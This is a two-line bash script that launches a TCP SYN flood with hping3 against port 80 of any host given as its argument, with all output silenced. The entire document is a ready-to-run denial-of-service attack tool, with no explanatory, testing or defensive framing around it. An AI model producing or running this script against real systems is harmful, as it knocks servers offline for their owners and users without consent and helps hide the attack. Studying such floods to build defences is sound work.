#!/bin/bash
hping3 -S --flood -p 80 "$1" > /dev/null 2>&1
